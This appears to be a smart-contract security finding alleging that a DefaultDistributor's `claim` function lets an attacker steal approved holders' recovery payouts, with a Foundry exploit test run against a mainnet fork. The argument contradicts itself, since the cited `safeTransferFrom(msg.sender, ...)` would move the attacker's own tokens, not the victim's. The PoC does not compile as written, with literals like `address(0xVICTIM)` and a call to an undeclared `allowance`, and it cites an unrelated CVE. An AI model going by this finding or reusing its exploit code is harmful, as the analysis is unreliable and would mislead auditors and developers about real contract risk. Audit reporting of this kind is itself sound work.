### Title
Arbitrary recipient parameter lets an attacker steal approved tranche-holders’ default-recovery proceeds - (File: contracts/DefaultDistributor.sol)

### Summary

`DefaultDistributor.claim(address _to)` redeems the caller-specified `msg.sender`’s entire tranche balance but sends the corresponding underlying payout to an unrestricted `_to` address. Any unprivileged attacker can call `claim(attacker)` after a victim approves the distributor, causing the victim’s tranche tokens to be transferred in while the recovery payout is transferred to the attacker. [1](#0-0) 

### Finding Description

The CVE represents a parameter-driven authorization bypass: attacker-controlled fields cause a privileged account operation to affect a different account. The closest in-scope analogue is `DefaultDistributor.claim`, which determines whose tranche tokens are redeemed from `msg.sender`, not from `_to`, but chooses the payout recipient from attacker-controlled `_to`. [1](#0-0) 

After the owner activates claims, `rate` is fixed from the distributor’s underlying balance divided by the tranche-token supply. [2](#0-1)  A user who approves `DefaultDistributor` to spend tranche tokens in preparation for claiming grants the contract authority to transfer those tokens, but `claim` does not verify that `msg.sender` is the beneficiary or that the beneficiary authorized the caller. [3](#0-2) 

An attacker can therefore execute the following sequence while `isActive` is true:

1. Victim holds tranche tokens and has approved `DefaultDistributor`.
2. Attacker calls `DefaultDistributor.claim(attacker)`.
3. The contract transfers the victim’s entire tranche balance to the distributor.
4. The contract transfers `victimBalance * rate / 1e18` underlying to the attacker.

There is no epoch-state, owner, manager, borrower, or claim-signature check that prevents the attacker from initiating the redemption for an approved victim. [1](#0-0) 

### Impact Explanation

This breaks the “one receipt, one payout to its owner” invariant and permits direct theft of the victim’s full default-recovery payout. [1](#0-0)  The stolen amount is exactly `balanceOf(victim) * rate / ONE_TRANCHE`, bounded only by the victim’s approved tranche balance and the active recovery rate. [4](#0-3) 

### Likelihood Explanation

Exploitation requires only an approved tranche-token holder and an active claim. Approval is the expected setup for claiming because the function uses `safeTransferFrom(msg.sender, address(this), trancheBal)`. [1](#0-0)  Any EOA or contract can call `claim`, no privileged role is involved, and the victim does not need to submit a transaction in the same block. [1](#0-0) 

### Recommendation

Remove the recipient parameter and always transfer the underlying to `msg.sender`, or replace the parameter with a signed authorization from the token owner that binds `to`, `amount`, `nonce`, deadline, and chain ID to the claim. At minimum, `claim` should not consume an approved victim’s entire balance through a caller-controlled beneficiary. [1](#0-0) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {DefaultDistributor} from "../contracts/DefaultDistributor.sol";

interface IERC20Like {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract DefaultDistributorRecipientTheftTest is Test {
    DefaultDistributor internal distributor;
    IERC20Like internal tranche;
    IERC20Like internal underlying;

    address internal constant VICTIM = address(0xVICTIM);
    address internal constant DISTRIBUTOR = address(0xDISTRIBUTOR);
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), vm.envUint("FORK_BLOCK"));

        distributor = DefaultDistributor(DISTRIBUTOR);
        tranche = IERC20Like(distributor.trancheToken());
        underlying = IERC20Like(distributor.token());

        require(distributor.isActive(), "claim not active");
        require(tranche.balanceOf(VICTIM) != 0, "victim has no tranche tokens");
        require(
            tranche.allowance(VICTIM, DISTRIBUTOR) >= tranche.balanceOf(VICTIM),
            "victim has not approved distributor"
        );
    }

    function testClaimPayoutCanBeRedirected() public {
        uint256 victimTrancheBalance = tranche.balanceOf(VICTIM);
        uint256 expectedPayout = victimTrancheBalance * distributor.rate() / distributor.ONE_TRANCHE();

        uint256 attackerUnderlyingBefore = underlying.balanceOf(attacker);
        uint256 distributorTrancheBefore = tranche.balanceOf(DISTRIBUTOR);

        vm.prank(attacker);
        distributor.claim(attacker);

        assertEq(tranche.balanceOf(VICTIM), 0);
        assertEq(
            tranche.balanceOf(DISTRIBUTOR) - distributorTrancheBefore,
            victimTrancheBalance
        );
        assertEq(
            underlying.balanceOf(attacker) - attackerUnderlyingBefore,
            expectedPayout
        );
    }
}
```
